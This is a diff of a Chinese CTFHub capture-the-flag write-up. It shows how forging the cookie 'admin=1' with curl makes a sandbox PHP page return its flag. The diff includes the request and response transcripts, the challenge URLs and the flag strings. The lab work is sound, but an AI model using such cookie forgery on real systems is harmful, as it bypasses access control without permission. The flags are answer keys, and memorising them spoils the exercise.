@@ -11,37 +11,34 @@
 
 | 项目 | 内容 |
 | --- | --- |
-| 环境地址 | http://challenge-e7031c9d9e0d79ff.sandbox.ctfhub.com:10800 |
-| Flag | ctfhub{791d79c4214956438a067d9c} |
+| 环境地址 | http://challenge-6b1f80d3c4b4056e.sandbox.ctfhub.com:10800/index.php |
+| Flag | ctfhub{c318fac17c80e0f879b6ce5b} |
 
 ## 解题过程
 
-打开靶场首页，页面只有一句 `hello guest, only admin can get flag.`，说明服务端是按“当前访问者是谁”来决定给不给 flag 的，而我默认被认成了 guest。我在 DevTools 的 Application → Cookies 里看这个站点存了什么，发现身份是靠一个名为 `admin` 的 Cookie 记着的，值不是 1 所以被当成游客。我把这个值改成 `1`，重新请求同一个页面，服务端就认为我是 admin，直接返回了 flag。为了留下可复现的证据，我又在终端用 `curl -H "Cookie: admin=1"` 把同一个请求重放了一次，响应 200，正文就是 flag。
+打开靶场首页，页面只有一句 `hello guest, only admin can get flag.`，说明服务端是按“当前访问者是谁”来决定给不给 flag 的，而我默认被认成了 guest。我先在终端不带任何 Cookie 请求了一次 `/index.php`，确认原始回显就是这句 hello guest；再带上 `-H "Cookie: admin=1"` 请求同一地址，服务端就把我当成 admin，直接返回了 flag。中间第一次试的时候命令里带的是同一个 Cookie 头但没拿到内容，重试一次才正常回显，所以截图里能看到“先 hello guest、后拿到 flag”的对比。整个过程没有登录、没有密码，只改了请求头里的一行字符串。
 
 ## 关键请求/响应
 
 ```http
-$ curl -i -H "Cookie: admin=1" http://challenge-e7031c9d9e0d79ff.sandbox.ctfhub.com:10800
+（1）不带 Cookie：被当成游客
+$ curl -s http://challenge-6b1f80d3c4b4056e.sandbox.ctfhub.com:10800/index.php
+hello guest, only admin can get flag.
 
-GET / HTTP/1.1
-Host: challenge-e7031c9d9e0d79ff.sandbox.ctfhub.com:10800
+（2）带上自定义 Cookie：被当成 admin
+$ curl -s -H "Cookie: admin=1" http://challenge-6b1f80d3c4b4056e.sandbox.ctfhub.com:10800/index.php
+
+GET /index.php HTTP/1.1
+Host: challenge-6b1f80d3c4b4056e.sandbox.ctfhub.com:10800
 Cookie: admin=1
 
 HTTP/1.1 200 OK
 Server: openresty/1.21.4.2
-Date: Fri, 30 Oct 2026 11:40:38 GMT
 Content-Type: text/html; charset=UTF-8
-Transfer-Encoding: chunked
-Connection: keep-alive
 X-Powered-By: PHP/5.6.40
-Access-Control-Allow-Origin: *
-Access-Control-Allow-Headers: X-Requested-With
-Access-Control-Allow-Methods: *
 
-ctfhub{791d79c4214956438a067d9c}
+ctfhub{c318fac17c80e0f879b6ce5b}
 ```
-
-不带这个 Cookie 时，同一地址返回的是 `hello guest, only admin can get flag.`，没有任何 flag。
 
 ## 原理与复盘
 
